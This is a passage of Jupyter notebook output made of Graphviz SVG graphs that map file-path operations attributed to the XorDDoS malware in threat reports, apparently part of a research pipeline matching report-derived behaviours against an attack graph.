rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"546\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x169caaa6e60>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Intezer.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"163pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 162.69 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 158.69,-127 158.69,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"77.34\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"77.34\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M77.34,-86.8C77.34,-75.16 77.34,-59.55 77.34,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"80.84,-46.18 77.34,-36.18 73.84,-46.18 80.84,-46.18\"/>\n<text text-anchor=\"middle\" x=\"101.84\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.extract</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x169caaa6cb0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Intezer.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"220pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 220.36 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 216.36,-127 216.36,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"80.36\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"80.36\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"80.36\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"80.36\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M30.24,-91.12C19.63,-86 9.72,-78.88 3.36,-69 -8.9,-49.95 16.19,-36.64 40.93,-28.57\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"42.12,-31.87 50.68,-25.63 40.1,-25.17 42.12,-31.87\"/>\n<text text-anchor=\"middle\" x=\"30.86\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M80.36,-86.8C80.36,-75.16 80.36,-59.55 80.36,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"83.86,-46.18 80.36,-36.18 76.86,-46.18 83.86,-46.18\"/>\n<text text-anchor=\"middle\" x=\"107.86\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">68.access</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M116.49,-88.87C124.42,-83.77 131.8,-77.22 136.36,-69 144.23,-54.8 131.19,-42.58 115.72,-33.78\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"116.96,-30.48 106.47,-29 113.74,-36.7 116.96,-30.48\"/>\n<text text-anchor=\"middle\" x=\"175.36\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">69.newfstatat</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x169caaa6e60>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Ms.csv raw doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"2938pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 2938.40 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 2934.4,-127 2934.4,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1434.4\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1434.4\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"202.4\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"202.4\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1357.13,-103.56C1062.81,-101.69 27.22,-93.41 3.4,-69 -1.26,-64.23 -0.89,-59.11 3.4,-54 23.6,-29.93 112.99,-22.41 164.83,-20.06\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"165.13,-23.55 174.98,-19.65 164.85,-16.56 165.13,-23.55\"/>\n<text text-anchor=\"middle\" x=\"25.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.drop</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1357.17,-103.46C1072.06,-101.29 93.97,-92.16 71.4,-69 41.17,-37.98 116.26,-25.93 164.86,-21.46\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"165.41,-24.92 175.08,-20.59 164.82,-17.95 165.41,-24.92\"/>\n<text text-anchor=\"middle\" x=\"108.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">9.resolv.conf</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1357.12,-103.3C1085.41,-100.67 189.2,-90.39 168.4,-69 159.51,-59.86 166.71,-48.13 176.74,-38.33\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"179.18,-40.85 184.35,-31.6 174.54,-35.6 179.18,-40.85\"/>\n<text text-anchor=\"middle\" x=\"191.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.fetch</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge12\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1357.26,-103.64C1100.27,-102.21 286.66,-95.57 237.4,-69 227.36,-63.59 219.58,-53.89 213.93,-44.47\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"217,-42.79 209.16,-35.67 210.85,-46.13 217,-42.79\"/>\n<text text-anchor=\"middle\" x=\"258.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">44.read</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge21\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1356.93,-104.02C1117.93,-103.76 402.17,-100.34 302.4,-69 290.76,-65.34 290.1,-59.88 279.4,-54 264.97,-46.07 248.41,-38.38 234.35,-32.23\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"235.65,-28.97 225.08,-28.24 232.88,-35.4 235.65,-28.97\"/>\n<text text-anchor=\"middle\" x=\"330.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge25\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1357.37,-102.88C1133.08,-99.4 490.41,-87.9 397.4,-69 379.2,-65.3 376.17,-59.38 358.4,-54 317.94,-41.75 270.42,-31.69 238.55,-25.55\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"238.85,-22.04 228.37,-23.62 237.54,-28.92 238.85,-22.04\"/>\n<text text-anchor=\"middle\" x=\"422.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">31.create</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"724.4\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"724.4\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1356.77,-104.13C1130.66,-104.12 486.53,-101.26 455.4,-69 422.37,-34.77 605.63,-23.5 687,-20.21\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"687.45,-23.7 697.31,-19.82 687.18,-16.7 687.45,-23.7\"/>\n<text text-anchor=\"middle\" x=\"492.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">7.resolv.conf</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1357.05,-103.8C1147.05,-102.9 580.06,-97.78 552.4,-69 511.66,-26.61 624.91,-19.56 686.91,-18.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"687.15,-22.27 697.12,-18.69 687.1,-15.27 687.15,-22.27\"/>\n<text text-anchor=\"middle\" x=\"575.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">39.fetch</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge16\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1357.08,-103.53C1158.91,-101.94 646.59,-95.3 621.4,-69 598.34,-44.92 649.71,-30.93 687.88,-24.15\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"688.94,-27.52 698.22,-22.42 687.79,-20.61 688.94,-27.52\"/>\n<text text-anchor=\"middle\" x=\"642.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">42.read</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge23\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1357.18,-103.22C1170.68,-100.97 709.29,-92.98 686.4,-69 677.04,-59.19 685.73,-47.12 697.15,-37.3\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"699.59,-39.83 705.3,-30.91 695.27,-34.32 699.59,-39.83\"/>\n<text text-anchor=\"middle\" x=\"714.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.m6_6n3</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge24\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1357.04,-103.45C1192.17,-101.77 817,-95.09 765.4,-69 754.35,-63.42 745.22,-53.37 738.4,-43.74\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"741.19,-41.61 732.79,-35.15 735.33,-45.44 741.19,-41.61\"/>\n<text text-anchor=\"middle\" x=\"790.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.create</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge35\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1356.95,-104.36C1218.27,-104.19 933.26,-99.93 839.4,-69 827.81,-65.18 827.28,-59.53 816.4,-54 797.81,-44.54 776.04,-36.15 758.34,-29.95\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"759.04,-26.49 748.44,-26.57 756.77,-33.11 759.04,-26.49\"/>\n<text text-anchor=\"middle\" x=\"865.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.contain</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge38\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1356.93,-103.56C1232.55,-102.06 994.21,-95.67 914.4,-69 902.82,-65.13 902.68,-58.67 891.4,-54 848.61,-36.3 795.8,-27.16 761.17,-22.73\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"761.39,-19.24 751.04,-21.51 760.55,-26.18 761.39,-19.24\"/>\n<text text-anchor=\"middle\" x=\"928.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.run</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge39\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1357.02,-104.77C1266.19,-104.13 1111.57,-98.19 982.4,-69 964.29,-64.91 961.33,-58.82 943.4,-54 880.54,-37.09 805.2,-27.25 761.27,-22.52\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"761.38,-19.01 751.07,-21.45 760.65,-25.97 761.38,-19.01\"/>\n<text text-anchor=\"middle\" x=\"1002.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.relate</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1263.4\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1263.4\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1357.42,-102.84C1246.11,-100.35 1051.08,-92.63 1029.4,-69 1024.89,-64.09 1025.05,-59.05 1029.4,-54 1053.6,-25.91 1160.07,-20.03 1220.71,-19.01\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1220.8,-22.51 1230.76,-18.88 1220.71,-15.51 1220.8,-22.51\"/>\n<text text-anchor=\"middle\" x=\"1052.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">11.hook</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1358.32,-101.36C1264.57,-97.31 1115.48,-87.95 1098.4,-69 1061.93,-28.54 1160.68,-20.34 1220.84,-18.97\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1220.92,-22.47 1230.86,-18.8 1220.8,-15.48 1220.92,-22.47\"/>\n<text text-anchor=\"middle\" x=\"1121.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">18.name</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge15\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1356.97,-104.68C1287.39,-103.45 1192.55,-96.53 1168.4,-69 1149.24,-47.16 1188.64,-33.38 1222.38,-25.94\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1223.51,-29.28 1232.6,-23.83 1222.1,-22.42 1223.51,-29.28\"/>\n<text text-anchor=\"middle\" x=\"1189.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.have</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge18\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1359.26,-100.68C1309.43,-96.71 1250.39,-88.03 1234.4,-69 1227.31,-60.56 1231.64,-50.16 1238.9,-41.03\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1241.68,-43.18 1245.82,-33.42 1236.5,-38.47 1241.68,-43.18\"/>\n<text text-anchor=\"middle\" x=\"1252.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">28.call</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge19\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1364.34,-97.3C1340.43,-92.34 1314.64,-83.77 1294.4,-69 1285.95,-62.83 1279.3,-53.6 1274.36,-44.74\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1277.47,-43.12 1269.83,-35.78 1271.22,-46.28 1277.47,-43.12\"/>\n<text text-anchor=\"middle\" x=\"1312.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">35.use</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge26\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1397.15,-89.22C1383.47,-83.4 1368.01,-76.35 1354.4,-69 1343.66,-63.2 1341.95,-60.13 1331.4,-54 1320.1,-47.43 1307.44,-40.74 1296.13,-34.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1297.51,-31.77 1287.01,-30.41 1294.37,-38.02 1297.51,-31.77\"/>\n<text text-anchor=\"middle\" x=\"1383.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">13.contain</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge29\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1430.97,-86.78C1427.91,-75.84 1422.32,-62.24 1412.4,-54 1382.71,-29.32 1338.74,-21.38 1306.25,-19.13\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1306.31,-15.63 1296.14,-18.58 1305.93,-22.62 1306.31,-15.63\"/>\n<text text-anchor=\"middle\" x=\"1448.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">14.check</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge41\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1462.65,-88.13C1476.46,-78.36 1488.21,-65.54 1478.4,-54 1456.72,-28.51 1362.26,-21.53 1306.01,-19.66\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1306.07,-16.16 1295.98,-19.36 1305.87,-23.16 1306.07,-16.16\"/>\n<text text-anchor=\"middle\" x=\"1512.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">12.provide</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1658.4\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1658.4\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge30\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1481.85,-90.72C1502.22,-84.65 1526.17,-77.03 1547.4,-69 1572.88,-59.36 1600.85,-46.74 1622.34,-36.6\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1623.9,-39.73 1631.42,-32.28 1620.89,-33.41 1623.9,-39.73\"/>\n<text text-anchor=\"middle\" x=\"1603.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">21.pass</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge32\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1490.79,-92.59C1500.65,-90.67 1510.82,-88.74 1520.4,-87 1568.71,-78.24 1589,-96.9 1629.4,-69 1637.77,-63.22 1644.05,-54.18 1648.6,-45.37\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1651.88,-46.61 1652.86,-36.06 1645.51,-43.7 1651.88,-46.61\"/>\n<text text-anchor=\"middle\" x=\"1668.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">22.delete</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge40\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1489.78,-92.26C1499.94,-90.33 1510.46,-88.48 1520.4,-87 1559.5,-81.16 1670.9,-98.34 1697.4,-69 1705.63,-59.89 1699.28,-49.22 1689.5,-40.09\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1691.45,-37.16 1681.53,-33.45 1686.97,-42.54 1691.45,-37.16\"/>\n<text text-anchor=\"middle\" x=\"1723.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.drop</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1800.4\" cy=\"-18\" rx=\"57.69\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1800.4\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/rs_dev</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1489.29,-92.15C1499.59,-90.22 1510.3,-88.39 1520.4,-87 1571.19,-80.02 1703.84,-90.45 1750.4,-69 1762.59,-63.38 1773.5,-53.44 1781.98,-43.89\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1784.79,-45.98 1788.52,-36.06 1779.42,-41.49 1784.79,-45.98\"/>\n<text text-anchor=\"middle\" x=\"1792.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">17.have</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1488.81,-92.09C1499.26,-90.14 1510.13,-88.32 1520.4,-87 1553.3,-82.77 1795.66,-93.15 1818.4,-69 1824.78,-62.22 1823.33,-53.01 1819.24,-44.35\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1822.25,-42.56 1814.23,-35.64 1816.18,-46.05 1822.25,-42.56\"/>\n<text text-anchor=\"middle\" x=\"1841.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">36.use</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1924.4\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1924.4\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1488.8,-92.03C1499.25,-90.08 1510.13,-88.28 1520.4,-87 1596.36,-77.55 1793.13,-96.93 1864.4,-69 1879.03,-63.27 1892.71,-52.48 1903.3,-42.39\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1905.84,-44.79 1910.43,-35.25 1900.89,-39.85 1905.84,-44.79\"/>\n<text text-anchor=\"middle\" x=\"1910.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.drop</text>\n</g>\n<!-- 9 -->\n<g id=\"node10\" class=\"node\">\n<title>9</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2060.4\" cy=\"-18\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2060.4\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1488.33,-92.04C1498.92,-90.06 1509.97,-88.25 1520.4,-87 1704.59,-64.95 1756.15,-108.51 1937.4,-69 1966.5,-62.66 1997.55,-49.98 2021.18,-38.98\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2022.97,-42 2030.5,-34.55 2019.96,-35.68 2022.97,-42\"/>\n<text text-anchor=\"middle\" x=\"2019.9\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.download</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge36\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1488.32,-91.96C1498.91,-89.98 1509.97,-88.2 1520.4,-87 1550.22,-83.58 2039.53,-90.58 2060.4,-69 2066.23,-62.97 2067.66,-54.36 2067.18,-45.98\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2070.64,-45.49 2065.81,-36.07 2063.71,-46.45 2070.64,-45.49\"/>\n<text text-anchor=\"middle\" x=\"2090.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">38.fetch</text>\n</g>\n<!-- 10 -->\n<g id=\"node11\" class=\"node\">\n<title>10</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2177.4\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2177.4\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sh$</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge13\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1488.32,-91.93C1498.91,-89.96 1509.96,-88.18 1520.4,-87 1586.34,-79.54 2055.35,-92.53 2117.4,-69 2132.5,-63.27 2146.53,-52.06 2157.23,-41.69\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2159.89,-43.98 2164.39,-34.39 2154.89,-39.08 2159.89,-43.98\"/>\n<text text-anchor=\"middle\" x=\"2163.4\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">34.find</text>\n</g>\n<!-- 11 -->\n<g id=\"node12\" class=\"node\">\n<title>11</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2293.4\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" 